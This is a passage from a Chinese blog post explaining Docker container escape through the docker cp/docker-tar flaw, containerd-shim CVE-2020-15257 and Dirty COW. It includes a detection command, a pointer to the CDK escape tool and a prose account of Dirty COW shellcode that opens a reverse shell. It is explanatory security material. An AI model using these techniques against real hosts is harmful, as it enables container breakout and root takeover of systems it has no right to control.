<p>影响版本：</p>
<p>Docker 19.03.0</p>
<p>漏洞原理：</p>
<p>执行docker cp后，docker daemon会启动一个docker-tar进程来完成这项复制任务。</p>
<p>若要从容器内复制文件到宿主机上，docker-tar原理：会切换进程的根目录（执行chroot）到容器根目录，然后将需要复制的文件或目录打tar包传递给Docker daemon，Docker daemon负责将内容解包到用户指定的宿主机目标路径。</p>
<p>原本使用chroot，是位了避免了符号连接导致的路径穿越，但是docker-tar仅仅chroot到了容器的文件系统，而程序本身不是容器化的，其在主机命名空间中运行，这意味着docker-tar不受cgroup或seccomp的限制。如果这时候docker-tar加载了容器内部的恶意动态链接库（本来应该从主机文件系统中加载库，但是由于docker-tar chroots到了容器内，所以从容器文件系统中加载动态链接库），被注入恶意代码，那就能够获得对主机完全的root访问权</p>
<p>CVE-2020-15257<br>漏洞原理</p>
<p>containerd是行业标准的容器运行时，可作为Linux和Windows的守护程序使用。在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。刚好在默认情况下，容器内部的进程是以root用户启动的。在两者的共同作用下，容器内部的进程就可以像主机中的containerd一样，连接containerd-shim监听的抽象Unix域套接字，调用containerd-shim提供的各种API，从而实现容器逃逸</p>
<p>判断方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#判断是否使用host模式</span><br><span class="line">cat /proc/net/unix | grep &#x27;containerd-shim&#x27;</span><br></pre></td></tr></table></figure>

<p>利用方法：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/releases">https://github.com/cdk-team/CDK/releases</a></p>
<p>下载对应架构的可执行文件，上传到容器并赋权</p>
<p>内核漏洞<br>DirtyCow(CVE-2016-5195)脏牛漏洞实现Docker 逃逸<br>Docker 与 宿主机共享内核，因此容器需要在存在dirtyCow漏洞的宿主机里</p>
<p>漏洞原理：</p>
<p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。</p>
<p>脏牛影响范围极广，存在Linux内核中已经有长达9年的时间，Linux内核&gt;&#x3D;2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。据说Linus本人也参与了修复,可见修复难度之大.这个洞非常精致隐蔽,分析完毕后不禁拍案叫绝,感觉刺激程度堪比小说</p>
<p>那为什么叫脏牛呢,是因为这是linux的COW:copy on write 写时复制机制存在缺陷(dirty)，而COW和cow谐音,所以也叫脏牛(dirtyCOW).使用脏牛，我们可在用户态下用普通用户的身份改写任意任何目录下任意用户的任意文件，甚至包括root用户的文件。试想如果给passwd文件追加一行有root权限的用户信息，就能轻松获取root权限。这个洞价值很高,据说几年前市面上有些安卓ROOT APP,采用的核心技术就是这个洞。</p>
<p>从编码的角度来看，一般情况下在 fork 之后会存在一个 execve 或其他 exec 系列的函数来执行一个新的程序，在调用 execve 的时候，内核会将新程序的代码段、数据段映射到子进程的内存中。上述创建子进程的过程，父进程将自身的内存空间完全拷贝给了子进程后，子进程很快就执行 execve 将新程序装载进入自己的内存中，覆盖了大部分父进程拷贝的内存，那么实际上大部分的父进程拷贝的数据是无用的。因而内核引入了 Copy-on-write 技术，即当 fork 创建完子进程后，父子进程实际上共享物理内存，当父子进程中发生了对内存写入的操作时，内核再为子进程分配新的内存页并将改动写入新内存页中，也就是在 fork 之后，execve 之前的过程。</p>
<p>VDSO其实就是将内核中的.so文件映射到内存，.so是基于Linux下的动态链接,其功能和作用类似与windows下.dll文件。</p>
<p>在Linux中，有一个功能：VDSO(virtual dvnamic shared object),这是一个小型共享库，能将内核自动映射到所有用户程序的地址空间,可以理解成将内核中的函数映射到内存中，方便大家访问。</p>
<p>dirty cow漏洞可以让我们获取只读内存的写的权限，我们首先利用dirty cow漏洞写入一段shellcode到VDSO映射的一段闲置内存中，然后改变函数的执行顺序，使得调用正常的任意函数之前都要执行这段shellcode。这段shellcode初始化的时候会检查是否是被root调用，如果是则继续执行，如果不是，则接着执行clock_gettime函数，接下来它会检测&#x2F;tmp&#x2F;.X文件的存在，如果存在，则这时已经是root权限了，然后它会打开一个反向的TCP链接，为Shellcode中填写的ip返回一个Shell。</p>

    </article>
    
    <div class="read-nums">
      <!-- id 将作为查询条件 -->
      <span id="2024/03/11/Docker逃逸原理/" class="leancloud_visitors" data-flag-title="Your Article Title">
        <em class="post-meta-item-text">浏览量</em>
        <i class="leancloud-visitors-count"></i>
      </span>
    </div>
    <div class="comments-intro">
      <h2>评论区</h2>
      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
    </div>
    <div id="vcomments" class="vcomments"></div>
    
  </div>
  <div class="article-catelogue">
    <div class="article-catelogue--wrapper">
      <div class="catelogue catelogue-1">
        <h3>目录</h3>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">Docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%88%A4%E6%96%AD"><span class="toc-number">1.2.</span> <span class="toc-text">环境判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E7%BB%84%E4%BB%B6"><span class="toc-number">1.3.1.</span> <span class="toc-text">docker组件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">逃逸方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">利用场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%951"><span class="toc-number">1.4.2.</span> <span class="toc-text">利用方法1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%952"><span class="toc-number">1.4.3.</span> <span class="toc-text">利用方法2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%953"><span class="toc-number">1.4.4.</span> <span class="toc-text">利用方法3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">概述：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%B2%E6%88%90%E5%8A%9F%E9%80%83%E9%80%B8%E5%88%B0%E5%AE%BF%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">已成功逃逸到宿主机</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">1.4.5.</span> <span class="toc-text">判断方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-number">1.4.6.</span> <span class="toc-text">复现：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">程序漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#runC%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-5736%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">runC容器逃逸漏洞（CVE-2019-5736）</span></a></li></ol></li></ol>
      </div>
      
        <div class="catelogue catelogue-2">
          
            <p>
              <span>上一篇：</span>
              <a href="/2024/03/13/容器技术-docker3/">docker容器</a>
            </p>
           
          
            <p>
              <span>下一篇</span>
              <a href="/2024/03/11/docker容器/">docker容器</a>
            </p>
          
        </div>
      
    </div>
  </div>
</div>


<script>
  // var定义，避免pjax重新进来造成的重复声明错误
  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
  new Valine({
    el: '#vcomments',
    appId: config.appId,
    appKey: config.appKey,
    placeholder: config.placeholder,
    meta: config.meta,
    recordIP: config.recordIP,
    visitor: config.visitor,
    enableQQ: config.enableQQ,
    path: '2024/03/11/Docker逃逸原理/'
  })
</script>


<script>
  $(document).on('pjax:complete', function() {
    const tocs = document.querySelector('.toc')
    const links = tocs ? tocs.querySelectorAll('a') : []
    links.forEach(link => {
      link.addEventListener('click', e => {
        const href = decodeURIComponent(e.href)
        href.search(/#(.*)/)
        const id = RegExp.$1
        const target = document.querySelector('#' + id)
        const top = target.offsetTop
        document.documentElement.scrollTo({
          top: top - 100,
          behavior: 'smooth'
        })
        e.preventDefault()
      })
    })
  })
</script> 

</div>
      <div class="main-right-wrapper"><div class="main-right">
  <div class="main-right--board">
    <div class="main-right--title">
      <h5>公告栏</h5>
      <i class="iconfont icon-gonggao"></i>
    </div>
    <div class="main-right--content">
      Hello~大噶好。唔系小曹宅，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
    </div>
  </div>

  <div id="aplayer" class="main-right--music"></div>

  <div class="operate-items">
    <div class="operate-item backtop">
      <i class="iconfont icon-huidaodingbu"></i>
      <span>回到顶部</span>
    </div>
    
    <div class="operate-item turn-comment hidden">
      <i class="iconfont icon-pinglun"></i>
      <span>查看评论</span>
    </div>
    
  </div>

  <div class="main-right--site">
    <div class="main-right--power">
      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
    </div>
    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">2262690094</a> </p>
  </div>
</div>

<script>
  function setOperateItem () {
    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
    const path = location.pathname
    const operateDom = document.querySelector('.main-right .operate-items')
    const commentDom = document.querySelector('.turn-comment')
    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');

    if (commentDom) {
      if (reg.test(path) || path.match(/\/log\/.+/)) {
        commentDom.classList.remove('hidden')
        const newDom = operateDom.cloneNode(true);
        const _backtopDom = newDom.querySelector('.backtop');
        const _commentDom = newDom.querySelector('.turn-comment');
        _backtopDom.addEventListener('click', () => backTopEvent());
        _commentDom.addEventListener('click', () => commentDomEvent());
        cateloguDom.appendChild(newDom);
      } else {
        commentDom.classList.add('hidden')
      }
    }
  }

  setOperateItem()
  const musics = JSON.parse(`[{"name":"不找了","artist":"隔壁老樊","url":"music/隔壁老樊 - 不找了.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"于是天气刚好","artist":"泪桥","url":"music/于是天气刚好 - 泪桥.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"安和桥","artist":"林芬宇","url":"music/林芬宇 - 安和桥.mp3","cover":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQo0SWQx6YrNA8lElaG4OOKLkNkNzLO1PflKg&usqp=CAU"}]`)
  const ap = new APlayer({
    container: document.querySelector('#aplayer'),
    audio: musics,
  })

  $(document).on('pjax:complete', function() {
    setOperateItem()
  })

  document.querySelector('.backtop').addEventListener('click', () => {
    backTopEvent();
  })
  const dom = document.querySelector('.turn-comment')
  dom && dom.addEventListener('click', () => {
    commentDomEvent();
  })

  function backTopEvent() {
    document.documentElement.scrollTo({
      top: 0,
      behavior: 'smooth'
    })
  }

  function commentDomEvent() {
    const commentDom = document.querySelector('.comments-intro')
    if (!commentDom) return
    const top = commentDom.offsetTop, height = commentDom.offsetHeight
    document.documentElement.scrollTo({
      top: top - 2 * height,
      behavior: 'smooth'
    })
  }
</script></div>
    </section>
  </div>
  <div id="progress" class="progress"></div>
  <div id="gray" class="gray"></div>

  <script>
    function initScroll () {
      document.addEventListener('scroll', () => {
        const doc = document.documentElement
        const scrollTop = doc.scrollTop
        const pageHeight = doc.offsetHeight
        const clientHeight = doc.clientHeight
        const ratio = scrollTop / (pageHeight - clientHeight)
        const progress = document.querySelector('#progress')
        const avatarImg = document.querySelector('.main-left--avatar')
        progress.style.width = (100 * ratio) + '%'
        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
      })
    }

    const rootPath = "/"

    const checkAndSetArticlePageLayout = () => {
      const path = location.pathname.replace(rootPath, '');
      if (
        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
        /^log\/.+/.test(path)
      ) {
        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
      } else {
        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
      }
    }

    const gray = "none"
    const setGrayStyle = () => {
      if (gray === 'none') {
        return
      } else if (gray === 'index') {
        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
      } else if (gray === 'all') {
        $('#gray').show()
      }
    }
    setGrayStyle()


    window.onload = function () {
      checkAndSetArticlePageLayout()
      setTimeout(() => {
        $('#load').slideUp()
        $('#container').slideToggle()
        setTimeout(() => {
          initScroll();
        }, 500)
      }, 500)
    }
    
    let status = 0
    // 对所有链接跳转事件绑定pjax容器container
    $(document).pjax('a[target!=_blank]', '#main-container', {
      container: '#main-container',
      fragment: '#main-container',
      timeout: 8000
    })

    $(document).on('pjax:start', function() {
    })
    $(document).on('pjax:complete', function() {
      status = 0
      $('.main-container').addClass('to-up').on('animationend', function() {
        $(this).removeClass('to-up')
      })
      setGrayStyle()
      checkAndSetArticlePageLayout()
    })
    $(document).on('pjax:popstate', function() {
      status = -1
      checkAndSetArticlePageLayout()
    });
  </script>
</body>
</html>